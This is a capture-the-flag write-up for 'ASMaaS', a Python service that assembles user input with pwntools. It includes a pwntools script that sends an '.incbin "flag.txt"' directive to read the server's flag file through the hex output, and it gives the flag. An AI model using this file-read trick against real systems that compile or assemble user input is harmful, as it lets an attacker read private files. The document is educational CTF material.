# ASMaaS

```
I implemented a service that lets you convert ASM to X86! Let's see if you can break it.

nc challs2.pyjail.club 18995
```

Attachment:

```python
#!/usr/local/bin/python3
import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import asm

try:
    shellcode = asm(input('> '), arch='amd64', os='linux')
except Exception as e:
    print('Could not compile shellcode. Exiting...')
    exit()

print('Compiled shellcode to X86!')
print(shellcode.hex(' '))
```

Flag is saved in `flag.txt`. In assembly, we can include external files via `.incbin` directive:

```python
from pwn import *

context(log_level="debug")

p = remote("challs2.pyjail.club", 18995)
#p = process(["python3", "asm.py"])
p.recvuntil(b"> ")
p.sendline(b".incbin \"flag.txt\"")
p.recvuntil(b"X86!")
p.recvline()
s = p.recvline().decode()
print(bytes.fromhex(s))
```

Then we can find flag from the hex string. Flag: `jail{yeah_just_include_flag.txt_lol}`.
